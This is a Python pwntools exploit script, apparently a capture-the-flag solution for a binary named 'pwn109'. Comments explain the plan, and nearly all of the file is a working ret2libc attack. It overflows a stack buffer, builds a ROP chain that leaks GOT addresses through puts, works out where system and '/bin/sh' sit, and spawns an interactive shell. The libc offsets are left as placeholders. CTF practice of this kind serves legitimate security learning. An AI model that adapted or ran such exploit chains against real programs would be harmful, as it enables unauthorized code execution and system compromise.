#!/usr/bin/python3
from pwn import *

'''
Exploit the overflow to leak addresses using puts()
Based on the leaked addresses for specific functions we will:
    - determine the version of libc
    - determine the location of system and string "/bin/sh"
    - push "/bin/sh" onto the stack and call system

1. what register pushes a value to puts?
    - rdi
    - use ROPgadget to find a suitable gadget

0x00000000004012a3 : pop rdi ; ret

2. how do we abuse this to read values from the .got.plt section?
    - first, lets find the addresses in the .got that we want to enumerate
        reloc.puts      0x00404018
        reloc.gets      0x00404020
        reloc.setvbuf   0x00404028
    - now how do we get these value known to us after linkage?
        find the plt entry for puts
        pop rdi off the stack
        load the address for target functions
        call puts with plt entry

3. now that we have leaked the dynamic address we take the last 3 char of each
    - slap them into a libc database
      https://libc.blukat.me/
    
system is       -0xXXXXXX   from gets
str_bin_sh is   +0xXXXXXX   from gets

we could use any function really gets, puts or setvbuf to find the addresses
its as simple as adding or subtracting from the function pointer
'''
context.binary = binary = ELF("./pwn109", checksec=False)
p = process()

main_address = int('0x004011f2', 16)
pop_rdi_ret_gadget = int('0x00000000004012a3', 16)
ret_address = int('0x000000000040101a', 16)

got_puts_addr = int('0x00404018', 16)
got_gets_addr = int('0x00404020', 16)
got_setvbuf_addr = int('0x00404028', 16)

plt_puts_addr = int('0x00401060', 16)

# buf of 0x20 = 32 bytes & 0x08 bytes to overflow EBP
payload = b"A"*0x28

# leak, pop rdi, load .got entry for function, call puts, repeat
payload += p64(pop_rdi_ret_gadget) + p64(got_puts_addr) + p64(plt_puts_addr)
payload += p64(pop_rdi_ret_gadget) + p64(got_gets_addr) + p64(plt_puts_addr)
payload += p64(pop_rdi_ret_gadget) + p64(got_setvbuf_addr) + p64(plt_puts_addr)
payload += p64(main_address)

p.recvuntil(b"ahead")
p.recv() #emoji
p.sendline(payload)

# grab output and unpack. dont use recvall the program will hang
output = p.recvuntil(b"ahead").split(b"\n")

# pad output with \x00 to 8 bytes
puts_leak = u64(output[0].ljust(8, b"\x00"))
gets_leak = u64(output[1].ljust(8, b"\x00"))
setvbuf_leak = u64(output[2].ljust(8, b"\x00"))

print(f"puts   : {hex(puts_leak)}")
print(f"gets   : {hex(gets_leak)}")
print(f"setvbuf: {hex(setvbuf_leak)}")

# calculate system and /bin/sh locations based on libc database
system_addr = gets_leak - 0xXXXXXX
stri_bin_sh = gets_leak + 0xXXXXXX

print(f"system : {hex(system_addr)}")
print(f"/bin/sh: {hex(stri_bin_sh)}")

second_payload = b"A"*0x28
second_payload += p64(ret_address) + p64(pop_rdi_ret_gadget)
second_payload += p64(stri_bin_sh) + p64(system_addr)
p.sendline(second_payload)
p.interactive()
